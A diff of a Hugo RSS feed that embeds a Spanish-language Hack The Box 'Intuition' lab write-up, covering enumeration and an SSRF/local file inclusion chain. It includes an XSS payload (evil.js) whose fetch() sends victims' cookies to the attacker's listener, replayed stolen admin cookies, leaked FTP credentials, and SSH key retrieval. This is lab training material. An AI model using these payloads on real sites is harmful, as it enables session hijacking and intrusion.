@@ -1,20 +1,824 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
-    <title>Reverse Ingeniering on Bajo el Teclado</title>
-    <link>//localhost:1313/tags/reverse-ingeniering/</link>
-    <description>Recent content in Reverse Ingeniering on Bajo el Teclado</description>
-    <generator>Hugo</generator>
-    <language>es-ES</language>
-    <copyright>&amp;copy; 2024, Andrés Del Cerro</copyright>
+    <title>Bajo el Teclado</title>
+    <link>http://localhost:1313/tags/reverse-ingeniering/</link>
+    <description>Recent content on Bajo el Teclado</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>es</language>
+    <managingEditor>adelcerrorodriguez@gmail.com (Andrés Del Cerro)</managingEditor>
+    <webMaster>adelcerrorodriguez@gmail.com (Andrés Del Cerro)</webMaster>
+    <copyright>© 2024 pointedsec</copyright>
     <lastBuildDate>Mon, 29 Jul 2024 00:00:00 +0000</lastBuildDate>
-    <atom:link href="//localhost:1313/tags/reverse-ingeniering/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="http://localhost:1313/tags/reverse-ingeniering/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Hack The Box: Intuitions Writeup | Hard</title>
-      <link>//localhost:1313/writeups/intuitions---hackthebox/</link>
-      <pubDate>Mon, 29 Jul 2024 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/writeups/intuitions---hackthebox/</guid>
-      <description>Hack The Box: Intuition Writeup Welcome to my detailed writeup of the hard difficulty machine &amp;ldquo;Intuition&amp;rdquo; on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.&#xA;Enumeration Con nmap descubrimos estos puertos abiertos.&#xA;22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA) |_ 256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.</description>
+      <link>http://localhost:1313/writeups/intuitions---hackthebox/</link>
+      <pubDate>Mon, 29 Jul 2024 00:00:00 +0000</pubDate><author>adelcerrorodriguez@gmail.com (Andrés Del Cerro)</author>
+      <guid>http://localhost:1313/writeups/intuitions---hackthebox/</guid>
+      <description>&lt;h1 id=&#34;hack-the-box-intuition-writeup&#34;&gt;Hack The Box: Intuition Writeup&lt;/h1&gt;
+&lt;p&gt;Welcome to my detailed writeup of the hard difficulty machine &lt;strong&gt;&amp;ldquo;Intuition&amp;rdquo;&lt;/strong&gt; on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.&lt;/p&gt;
+&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
+&lt;p&gt;Con nmap descubrimos estos puertos abiertos.&lt;/p&gt;
+
+
+
+
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;1&lt;/span&gt;&lt;span&gt;22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;2&lt;/span&gt;&lt;span&gt;| ssh-hostkey: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;3&lt;/span&gt;&lt;span&gt;|   &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;256&lt;/span&gt; b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;4&lt;/span&gt;&lt;span&gt;|_  &lt;span style=&#34;color:#ff0;font-weight:bold&#34;&gt;256&lt;/span&gt; 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;5&lt;/span&gt;&lt;span&gt;80/tcp open  http    nginx 1.18.0 (Ubuntu)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;6&lt;/span&gt;&lt;span&gt;|_http-server-header: nginx/1.18.0 (Ubuntu)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;7&lt;/span&gt;&lt;span&gt;|_http-title: Did not follow redirect to http://comprezzor.htb/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272&#34;&gt;8&lt;/span&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Haciendo un breve reconocimiento en la web y utilizando &lt;code&gt;wfuzz&lt;/code&gt; encontramos los siguientes subdominios.&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h1 id="hack-the-box-intuition-writeup">Hack The Box: Intuition Writeup</h1>
+<p>Welcome to my detailed writeup of the hard difficulty machine <strong>&ldquo;Intuition&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>Con nmap descubrimos estos puertos abiertos.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>|   <span style="color:#ff0;font-weight:bold">256</span> b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>|_  <span style="color:#ff0;font-weight:bold">256</span> 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>|_http-title: Did not follow redirect to http://comprezzor.htb/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div>
+<p>Haciendo un breve reconocimiento en la web y utilizando <code>wfuzz</code> encontramos los siguientes subdominios.</p>
+<ul>
+<li>comprezzor.htb</li>
+<li>report.comprezzor.htb</li>
+<li>auth.comprezzor.htb</li>
+<li>dashboard.comprezzor.htb</li>
+</ul>
+<p>En <code>auth.comprezzor.htb podemos hacernos una cuenta y acceder a </code>report.comprezzor.htb`</p>
+<p>Vemos que se utiliza cifrado LMZA, esto nos recuerda al último backdoor que ocurrió en OpenSSH con la librería &ldquo;xz&rdquo; pero no van por ahí los tiros.</p>
+<h1 id="foothold">FootHold</h1>
+<p>Encontramos un XSS en report.comprezzor.htb.
+<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ python3 -m http.server <span style="color:#ff0;font-weight:bold">8000</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Serving HTTP on 0.0.0.0 port <span style="color:#ff0;font-weight:bold">8000</span> (http://0.0.0.0:8000/) ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>10.129.230.246 - - [29/Jul/2024 19:40:09] code 404, message File not found
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>10.129.230.246 - - [29/Jul/2024 19:40:09] <span style="color:#0ff;font-weight:bold">&#34;GET /img.png HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">404</span> -</span></span></code></pre></div>
+<h2 id="robando-la-cookie-del-moderador">Robando la cookie del moderador</h2>
+<p>Por lo cual, podemos probar a ver si no hay ningún tipo de sanitización y podemos inyectar un script de javascript.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#007f7f">// evil.js
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">const</span> cookies = <span style="color:#fff;font-weight:bold">document</span>.cookie
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>fetch(<span style="color:#0ff;font-weight:bold">&#34;http://10.10.14.71:8000/collect?c=&#34;</span> + <span style="color:#fff;font-weight:bold">document</span>.cookie).
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>	then(d =&gt; console.log(<span style="color:#0ff;font-weight:bold">&#34;Consulta realizada&#34;</span>))</span></span></code></pre></div>
+<p><img src="images/Screenshot_2.png" alt="Write-up Image"></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ python3 -m http.server <span style="color:#ff0;font-weight:bold">8000</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Serving HTTP on 0.0.0.0 port <span style="color:#ff0;font-weight:bold">8000</span> (http://0.0.0.0:8000/) ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>10.129.230.246 - - [29/Jul/2024 19:34:05] <span style="color:#0ff;font-weight:bold">&#34;GET /evil.js HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">304</span> -
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>10.129.230.246 - - [29/Jul/2024 19:34:05] code 404, message File not found
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>10.129.230.246 - - [29/Jul/2024 19:34:05] <span style="color:#0ff;font-weight:bold">&#34;GET /collect?c=user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">404</span> -</span></span></code></pre></div>
+<p>Esta cookie, podemos utilizarla para iniciar sesión en el subdominio.  <code>dashboard.comprezzor.htb</code></p>
+<p><img src="images/Screenshot_3.png" alt="Write-up Image"></p>
+<h2 id="robando-la-cookie-del-administrador">Robando la cookie del administrador</h2>
+<p>Después de investigar un rato, podemos suponer que los reportes con alta prioridad serán revisados por un usuario administrador, por lo cual si en este panel si inyectamos otra vez el script malicioso y lo establecemos como alta prioridad..</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>10.129.230.246 - - [29/Jul/2024 19:36:55] <span style="color:#0ff;font-weight:bold">&#34;GET /collect?c=user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5 HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">404</span></span></span></code></pre></div>
+<p>Tenemos una cookie distinta, y si la decodificamos de base64.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34;eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>{<span style="color:#0ff;font-weight:bold">&#34;user_id&#34;</span>: 1, <span style="color:#0ff;font-weight:bold">&#34;username&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;admin&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;role&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;admin&#34;</span>}|34822333d444ae0e4022f6cc679ac9d26d1d1d682c59c61cfbea29d776d589d9</span></span></code></pre></div>
+<p>Ahora podemos acceder al panel de administración como el usuario admin.</p>
+<p><img src="images/Screenshot_4.png" alt="Write-up Image"></p>
+<h2 id="local-file-inclusion">Local File Inclusion</h2>
+<p>En este panel veo una funcionalidad que me llama la atención. <code>/create_pdf_report</code> . Lo primero que pienso es en un SSRF pero primero hay que enumerar que hace esta funcionalidad.</p>
+<p><img src="images/Screenshot_5.png" alt="Write-up Image"></p>
+<p>Podemos hacer una especie de captura de pantalla de la URL que queramos.
+<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ exiftool report_88754.pdf | grep Creator
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Creator                         : wkhtmltopdf 0.12.6</span></span></code></pre></div>
+<p>Podemos ver la herramienta utilizada para esta funcionalidad, y una simple búsqueda en Google nos reporta que esta herramienta tiene una vulnerabilidad de tipo SSRF.
+<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
+<p>Detecto un comportamiento un tanto extraño
+Ya que si intentamos apuntar a un recurso local del sistema nos reporta que la URL es inválida.
+<img src="images/Screenshot_9.png" alt="Write-up Image">
+Pero si introducimos un espacio delante, nos reporta un error distinto.
+<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
+<p>Si nos ponemos en escucha con <code>nc</code> podemos detectar que de esta función se encarga una utilidad en Python.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>nc -lvnp <span style="color:#ff0;font-weight:bold">8000</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>listening on [any] <span style="color:#ff0;font-weight:bold">8000</span> ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>connect to [10.10.14.71] from (UNKNOWN) [10.129.230.246] <span style="color:#ff0;font-weight:bold">55388</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>GET / HTTP/1.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>Accept-Encoding: identity
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>Host: 10.10.14.71:8000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>**User-Agent: Python-urllib/3.11**</span></span></code></pre></div>
+<p>Pero bueno, aprovechandonos del error encontrado al espaciar la URL, podemos cargar un recurso local del sistema con file://.
+<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
+<p>Ahora cargando el <code>/proc/self/cmdline</code> podemos ver cual ha sido el comando para ejecutar el proceso del que depende esta funcionalidad.</p>
+<p><img src="images/Screenshot_12.png" alt="Write-up Image"></p>
+<h2 id="filtrando-el-código-fuente">Filtrando el código fuente</h2>
+<p>Por lo cual, podemos cargar el archivo <code>/app/code/app.py</code> y podemos ver dos cosas interesantes.</p>
+<ul>
+<li>Una clave secreta.</li>
+<li>una linea <code>redirect from blueprints.index.index</code></li>
+</ul>
+<p><img src="images/Screenshot_13.png" alt="Write-up Image"></p>
+<p>Cargando el archivo <code> /app/code/blueprints/index/index.py</code>
+<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
+<p>Este archivo no nos sirve de nada pero ya sabemos que la ruta existe.
+Una vez sabiendo que esta ruta existe, gracias al <code>app.py</code> podemos suponer que también existen estos recursos.</p>
+<ul>
+<li><code>/app/code/blueprints/report/report.py</code></li>
+<li><code>/app/code/blueprints/auth/auth.py</code></li>
+<li><code>/app/code/blueprints/dashboard/dashboard.py</code></li>
+</ul>
+<p>Antes, en el panel de administración, había detectado una funcionalidad que no sabía exactamente que es lo que hacía.
+<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
+<p>Vamos a echar un ojo al archivo <code>dashboard.py</code> a ver que contiene..
+Si miramos con ojo de halcón, detectamos la siguiente linea.
+<code>ftp.login(user='ftp_admin', passwd='u3jai8y71s2')</code></p>
+<p><img src="images/Screenshot_16.png" alt="Write-up Image"></p>
+<p>Intento iniciar sesión por ssh pero no es posible.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>ssh ftp_admin@comprezzor.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>The authenticity of host <span style="color:#0ff;font-weight:bold">&#39;comprezzor.htb (10.129.230.246)&#39;</span> can<span style="color:#0ff;font-weight:bold">&#39;t be established.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span><span style="color:#0ff;font-weight:bold">ED25519 key fingerprint is SHA256:++SuiiJ+ZwG7d5q6fb9KqhQRx1gGhVOfGR24bbTuipg.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span><span style="color:#0ff;font-weight:bold">This key is not known by any other names.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span><span style="color:#0ff;font-weight:bold">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span><span style="color:#0ff;font-weight:bold">Warning: Permanently added &#39;</span>comprezzor.htb<span style="color:#0ff;font-weight:bold">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span><span style="color:#0ff;font-weight:bold">ftp_admin@comprezzor.htb&#39;</span>s password:</span></span></code></pre></div>
+<p>Recordemos que el puerto <code>21/TCP</code> estaba cerrado, pero gracias a este LFI, podemos cargar recursos del FTP ya que podemos solicitar el recurso <code>ftp://ftp_admin:u3jai8y71s2@ftp.local</code></p>
+<h2 id="consiguiendo-una-id_rsa">Consiguiendo una id_rsa</h2>
+<p><img src="images/Screenshot_17.png" alt="Write-up Image">
+Hay un archivo <code>private-*.key</code> que me llama la atención.</p>
+<p>Ahora lo podemos solicitar a través del SSRF con <code> ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key</code></p>
+<p>Y tenemos una clave privada.
+<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
+<p>Como no se para que usuario es esta clave privada, podemos revisar el archivo <code>welcome_note.txt</code>
+Y vemos que esto es para los desarrolladores, por lo cual el nombre de usuario seguramente contenga la palabra <code>dev</code>.
+Además también vemos una passphrase para esta clave privada. <code>Y27SH19HDIWD</code></p>
+<p><img src="images/Screenshot_19.png" alt="Write-up Image"></p>
+<p>Pero simplemente podemos comprobar a que usuario pertenece esta clave privada validando a con <code>ssh-add</code> la passphrase que hemos encontrado añadiendola a nuestro repositorio de claves privadas.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ ssh-add id_rsa 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Enter passphrase <span style="color:#fff;font-weight:bold">for</span> id_rsa: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Identity added: id_rsa (dev_acc@local)</span></span></code></pre></div>
+<p><code>dev_acc</code> es el nombre de usuario de esta clave privada, ahora vamos a intentar iniciar sesión en la máquina víctima.
+Aunque antes vamos a eliminar la clave privada de mi repositorio.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ ssh-add -d id_rsa 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Identity removed: id_rsa RSA (no comment)</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ ssh dev_acc@comprezzor.htb -i id_rsa 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Enter passphrase <span style="color:#fff;font-weight:bold">for</span> key <span style="color:#0ff;font-weight:bold">&#39;id_rsa&#39;</span>: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Last login: Mon Jul <span style="color:#ff0;font-weight:bold">29</span> 16:29:28 <span style="color:#ff0;font-weight:bold">2024</span> from 10.10.14.71
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>dev_acc@intuition:~$ id
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>uid=1001(dev_acc) gid=1001(dev_acc) groups=1001(dev_acc)</span></span></code></pre></div>
+<h1 id="user-pivoting">User Pivoting</h1>
+<p>Enumerando la aplicación web en <code>/var/www/app</code> podemos ver que de base de datos utiliza SQLite3 ya que se emplean archivos <code>.db</code>.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>dev_acc@intuition:/var/www/app/blueprints/report$ ls
